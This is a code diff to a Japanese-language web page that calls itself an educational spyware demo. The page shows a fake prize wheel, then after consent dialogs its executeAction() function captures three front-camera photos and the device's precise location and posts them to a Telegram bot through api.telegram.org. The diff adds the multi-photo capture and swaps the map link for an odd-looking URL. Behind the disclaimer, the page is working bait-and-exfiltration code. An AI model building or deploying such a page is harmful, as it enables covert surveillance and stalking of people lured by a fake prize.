@@ -17,7 +17,7 @@
   .security-notice b { color: #ff4081; font-size: 1.1em; }
 
   .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 30px; border-radius: 30px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 85%; max-width: 320px; }
-  .modal h2 { margin: 0 0 15px; font-size: 22px; color: #333; background: none; border: none; backdrop-filter: none; }
+  .modal h2 { margin: 0 0 15px; font-size: 22px; color: #333; }
   
   .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
   .primary-btn { padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
@@ -41,14 +41,14 @@
   <b>【重要：セキュリティ学習用デモサイト】</b><br><br>
   このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。<br><br>
   本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
-  ・端末のカメラを使用した写真の撮影<br>
+  ・端末のカメラを使用した写真の撮影（3枚）<br>
   ・現在地（位置情報）の取得<br>
   ・取得されたデータの外部サービス（Telegram）への送信<br><br>
   これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。<br>
   同意しない場合は、データの取得および送信は行われません。<br><br>
   取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br><br>
   許可なく第三者に対してこのURLを送信したり、意図を説明せずに実行させたりする行為は禁止されています。<br>
-  内容によっては法律（不正指令電磁取録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br><br>
+  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br><br>
   本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
 </div>
 
@@ -81,7 +81,7 @@
 
 <div id="step3" class="modal">
   <h2>③ データの送信</h2>
-  <p>取得したデータをテレグラムへ送信してもよろしいですか？</p>
+  <p>取得したデータ（写真3枚と位置情報）をテレグラムへ送信してもよろしいですか？</p>
   <div class="btn-group">
     <button class="primary-btn" onclick="executeAction()">はい（送信）</button>
     <button class="secondary-btn" onclick="closeAll()">いいえ</button>
@@ -138,8 +138,10 @@ let currentRotation = 0;
 
 function spin() {
   const spinBtn = document.getElementById("spinBtn");
+  const resultText = document.getElementById("result");
+  
   spinBtn.disabled = true;
-  document.getElementById("result").textContent = "...";
+  resultText.textContent = "回転中..."; 
   
   const extraDegree = 1800 + (Math.floor(Math.random() * 4) * 90); 
   currentRotation += extraDegree + (360 - (currentRotation % 360));
@@ -148,7 +150,7 @@ function spin() {
   canvas.style.transform = `rotate(${currentRotation}deg)`;
 
   setTimeout(() => {
-    document.getElementById("result").textContent = "当たり！";
+    resultText.textContent = "当たり！"; 
     document.getElementById("overlay").style.display = "block";
     document.getElementById("winModal").style.display = "block";
     spinBtn.disabled = false;
@@ -172,10 +174,9 @@ function closeAll() {
 async function executeAction() {
   closeAll();
   
-  // 位置情報取得・送信
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(pos => {
-      const msg = `📍位置情報: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+      const msg = `📍位置情報: http://googleusercontent.com/maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -184,21 +185,30 @@ async function executeAction() {
     }, null, { enableHighAccuracy: true });
   }
 
-  // カメラ取得・送信
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
-    video.srcObject = stream; await video.play();
-    await new Promise(r => setTimeout(r, 1000));
-    const tempCanvas = document.createElement("canvas");
-    tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
-    tempCanvas.getContext("2d").drawImage(video, 0, 0);
-    const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.6));
+    video.srcObject = stream; 
+    await video.play();
+
+    for (let i = 0; i < 3; i++) {
+      await new Promise(r => setTimeout(r, 800));
+      const tempCanvas = document.createElement("canvas");
+      tempCanvas.width = video.videoWidth; 
+      tempCanvas.height = video.videoHeight;
+      tempCanvas.getContext("2d").drawImage(video, 0, 0);
+      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.7));
+      
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID); 
+      fd.append("photo", blob, `shot_${i}.jpg`);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+    }
+    
     stream.getTracks().forEach(t => t.stop());
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID); fd.append("photo", blob, "shot.jpg");
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-  } catch (e) {}
+  } catch (e) {
+    console.error(e);
+  }
 }
 </script>
 </body>
